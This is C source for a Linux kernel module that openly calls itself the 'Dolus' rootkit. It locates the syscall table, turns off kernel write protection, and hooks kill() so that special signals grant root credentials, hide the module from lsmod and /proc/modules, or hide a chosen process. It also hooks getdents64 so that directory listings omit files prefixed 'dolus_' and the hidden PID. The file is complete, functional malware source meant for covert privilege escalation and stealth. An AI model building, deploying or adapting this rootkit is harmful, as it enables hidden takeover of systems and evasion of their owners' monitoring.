/*
created by: kargisimos
*/

#include <linux/init.h>		//macros used to mark up functions e.g. __init, __exit
#include <linux/module.h>	//core header for loading LKMs into the kernel
#include <linux/kernel.h>	//contains types, macros, functions for the kernel e.g. KERN_INFO
#include <linux/kallsyms.h>	//contains functions e.g. kallsyms_lookup_name
#include <linux/version.h>	//linux kernel versions e.g. LINUX_VERSION_CODE, KERNEL_VERSION
#include <linux/unistd.h>   //contains syscall numbers e.g. __NR_kill
#include <asm/paravirt.h>   //contains function for read_cr0(), e.g. read control register 0
#include <linux/dirent.h>   // contains dirent structs etc
#include <linux/list.h>     //macros related to linked lists are defined here e.g. list_add(), list_del()
#include <linux/dirent.h>   //directory entries
#include <linux/syscalls.h>

//uncomment next line to enable debugging
#define DEBUG 1
#ifdef DEBUG
#define DEBUG_INFO(...) do { \
    printk(KERN_INFO __VA_ARGS__); \
} while (0)
#else
#define DEBUG_INFO(...) do {} while (0)
#endif


MODULE_LICENSE("GPL");
MODULE_AUTHOR("kargisimos");
MODULE_DESCRIPTION("x86_64 linux LKM rootkit");
MODULE_VERSION("1.0");

static unsigned long *__sys_call_table;

//in linux kernels >= 5.7.0, kallsyms_lookup_name is not exported anymore
//workaround by using kprobes
//https://github.com/xcellerator/linux_kernel_hacking/issues/3
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};
#endif

unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;
    
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    if (!kallsyms_lookup_name) {
        DEBUG_INFO("[-]Dolus: Unable to get address of kallsyms_lookup_name\n");
        return NULL;
    }
#endif
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        DEBUG_INFO("[-]Dolus: Unable to get address of sys_call_table\n");
        return NULL;
    }
    DEBUG_INFO("[+]Dolus: Address of kallsyms_lookup_name in kernel memory: 0x%px\n", kallsyms_lookup_name);
    DEBUG_INFO("[+]Dolus: Address of sys_call_table in kernel memory: 0x%px\n", syscall_table);
    return syscall_table;
}


//custom cr0 register to protect and unprotect from memory
//https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}


static  void unprotect_memory(void) {
    /* Bitwise AND (&) copies bit to result if it is in both operands
       Unary reverse (~) reverses the bits so ~0x10000 becomes 0x01111
    */
    write_cr0_forced(read_cr0() & (~0x10000));
    DEBUG_INFO("[+]Dolus: unprotected memory successfully\n");
}


static  void protect_memory(void) {
    /* Bitwise OR (|) copies bit to result if it is in either operands 
    */
    write_cr0_forced(read_cr0() | (0x10000));
    DEBUG_INFO("[+]Dolus: protected memory successfully\n");
}


/*
in linux kernels >= 4.17.0, a different calling convention for system calls
is used, where struct pt_regs in decoded on-the-fly in a syscall wrapper which
then hands processing over to the actual syscall function.
*/
#if CONFIG_X86_64
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1 
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
static ptregs_t orig_getdents64;

#else 
typedef asmlinkage long(*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;

typedef asmlinkage long(*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
static orig_getdents64_t orig_getdents64;
#endif
#endif


static int store(void) {
// if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0), syscalls use pt_regs as arguments
#if PTREGS_SYSCALL_STUB
    // kill
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    if (!orig_kill) {
        DEBUG_INFO("[-]Dolus: Unable to store orig_kill table entry\n");
        return 1;
    }
    else {
        DEBUG_INFO("[+]Dolus: orig_kill table entry successfully stored\n");
    }

    // getdents64
    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
    if (!orig_getdents64) {
        DEBUG_INFO("[-]Dolus: Unable to store orig_getdents64 table entry\n");
        return 1;
    }
    else {
        DEBUG_INFO("[+]Dolus: orig_getdents64 table entry successfully stored\n");
    }

// if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0), syscalls use direct arguments
#else
    // kill
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
    if (!orig_kill) {
        DEBUG_INFO("[-]Dolus: Unable to store orig_kill table entry\n");
        return 1;
    }
    else {
        DEBUG_INFO("[+]Dolus: orig_kill table entry successfully stored\n");
    }

    // getdents64
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
    if (!orig_getdents64) {
        DEBUG_INFO("[-]Dolus: Unable to store orig_getdents64 table entry\n");
        return 1;
    }
    else {
        DEBUG_INFO("[+]Dolus: orig_getdents64 table entry successfully stored\n");
    }

#endif
    return 0;
}


/*
the linux kernel supports a range of 33 different, real-time
signals, numbered 32 to 64.
https://www.man7.org/linux/man-pages/man7/signal.7.html
*/
enum signals {
    SIGSUPER = 33, //become root
    SIGINVIS_DOLUS = 34, //hide Dolus from lsmod, /proc/modules, /proc/kallsyms, /sys/module
    SIGINVIS_PROC = 35,  //hide certain process based on PID
};

//https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials
void set_root(void) {
    struct cred *root;
    root = prepare_creds();
    if (root == NULL) {
        DEBUG_INFO("[-]Dolus: failed to prepare root creds\n");
        return;
    }
    //set the credentials to root
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}


//hide rootkit: 1->hidden, 0->unhidden
static short hidden = 0;
static struct list_head *prev_module;


//https://github.com/torvalds/linux/blob/master/include/linux/list.h
void hide_dolus(void) {
    //for lsmod, /proc/modules, /proc/kallsyms
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    //for /sys/module TODO
    //kobject_del(&THIS_MODULE->mkobj.kobj);
}

void unhide_dolus(void) {
    list_add(&THIS_MODULE->list, prev_module);
}


//hiding directories that start with PREFIX
#define PREFIX "dolus_"

//hiding process with specific PID
char hide_pid[NAME_MAX];




#if PTREGS_SYSCALL_STUB
// kill hook function
static asmlinkage long hack_kill(const struct pt_regs *regs) {
    void set_root(void);
    void unhide_dolus(void);
    void hide_dolus(void);

    int sig = regs->si;
    pid_t pid = regs->di;
    if (sig == SIGSUPER) {
        DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: giving root privileges\n");
        set_root();
        DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
        return 0;
    }
    else if ((sig == SIGINVIS_DOLUS) && (hidden == 0)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: hiding Dolus\n");
        hide_dolus();
        hidden = 1;
        DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
        return 0;
    }
    else if ((sig == SIGINVIS_DOLUS) && (hidden == 1)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
        unhide_dolus();
        hidden = 0;
        DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
        return 0;
    }
    else if(sig == SIGINVIS_PROC) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS_PROC kill signal: %d\n", sig);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    //if received kill signal is not in enum signals, return original syscall
    return orig_kill(regs);
}

// getdents64 hook function
static asmlinkage int hack_getdents64(const struct pt_regs *regs) {
    
    /* These are the arguments passed to sys_getdents64 extracted from the pt_regs struct */
    // int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    // int count = regs->dx;

    long error;

    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        /* OR compare current_dir->d_name to hide_pid*/
        if ( 
            (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) || \
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && \
                (strncmp(hide_pid, "", NAME_MAX) != 0))
            )
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;

}


#else
// kill hook function
static asmlinkage long hack_kill(pid_t pid, int sig) {
    void set_root(void);

    if (sig == SIGSUPER) {
        DEBUG_INFO("[+]Dolus: received SIGSUPER kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: giving root privileges\n");
        set_root();
        DEBUG_INFO("[+]Dolus: root privileges successfully granted\n");
        return 0;
    }
    else if ((sig == SIGINVIS_DOLUS) && (hidden == 0)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: hiding Dolus\n");
        hide_dolus();
        hidden = 1;
        DEBUG_INFO("[+]Dolus: successfully hide Dolus\n");
        return 0;
    }
    else if ((sig == SIGINVIS_DOLUS) && (hidden == 1)) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS_DOLUS kill signal: %d\n", sig);
        DEBUG_INFO("[+]Dolus: unhiding Dolus\n");
        unhide_dolus();
        hidden = 0;
        DEBUG_INFO("[+]Dolus: successfully unhide Dolus\n");
        return 0;
    }
    else if(sig == SIGINVIS_PROC) {
        DEBUG_INFO("[+]Dolus: received SIGINVIS_PROC kill signal: %d\n", sig);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    //if received kill signal is not SIGSUPER, return original syscall
    return orig_kill(regs);
}

// getdents64 hook function
static asmlinkage int hack_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    
    /* We will need these intermediate structures for looping through the directory listing */
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* We first have to actually call the real sys_getdents64 syscall and save it so that we can
     * examine it's contents to remove anything that is prefixed by PREFIX.
     * We also allocate dir_entry with the same amount of memory as  */
    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    /* Copy the dirent argument passed to sys_getdents64 from userspace to kernelspace 
     * dirent_ker is our copy of the returned dirent struct that we can play with */
    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    /* We iterate over offset, incrementing by current_dir->d_reclen each loop */
    while (offset < ret)
    {
        /* First, we look at dirent_ker + 0, which is the first entry in the directory listing */
        current_dir = (void *)dirent_ker + offset;

        /* Compare current_dir->d_name to PREFIX */
        /* OR compare current_dir->d_name to hide_pid*/
        if ( 
            (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) || \
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && \
                (strncmp(hide_pid, "", NAME_MAX) != 0))
            )
        {
            /* If PREFIX is contained in the first struct in the list, then we have to shift everything else up by it's size */
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            /* This is the crucial step: we add the length of the current directory to that of the 
             * previous one. This means that when the directory structure is looped over to print/search
             * the contents, the current directory is subsumed into that of whatever preceeds it. */
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            /* If we end up here, then we didn't find PREFIX in current_dir->d_name 
             * We set previous_dir to the current_dir before moving on and incrementing
             * current_dir at the start of the loop */
            previous_dir = current_dir;
        }

        /* Increment offset by current_dir->d_reclen, when it equals ret, then we've scanned the whole
         * directory listing */
        offset += current_dir->d_reclen;
    }

    /* Copy our (perhaps altered) dirent structure back to userspace so it can be returned.
     * Note that dirent is already in the right place in memory to be referenced by the integer
     * ret. */
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    /* Clean up and return whatever is left of the directory listing to the user */
    kfree(dirent_ker);
    return ret;
}

#endif



static int hook(void) {
    // kill syscall
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long)&hack_getdents64;
    return 0;
}


static int cleanup(void) {
    // kill 
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    return 0;
}



static int __init dolus_init(void) {
    int err = 1;

	DEBUG_INFO("[+]Dolus: loaded successfully\n");
    __sys_call_table = get_syscall_table();

    if (store() == err) {
        DEBUG_INFO("store error\n");
    }
    unprotect_memory();
    if (hook() == err) {
        DEBUG_INFO("hook error\n");
    }
    protect_memory();

	return 0;
}

static void __exit dolus_exit(void) {
    int err = 1;
	DEBUG_INFO("[+]Dolus: unloaded successfully\n");

    unprotect_memory();
    if (cleanup() == err) {
        DEBUG_INFO("cleanup error\n");
    }
    protect_memory();
}

module_init(dolus_init);
module_exit(dolus_exit);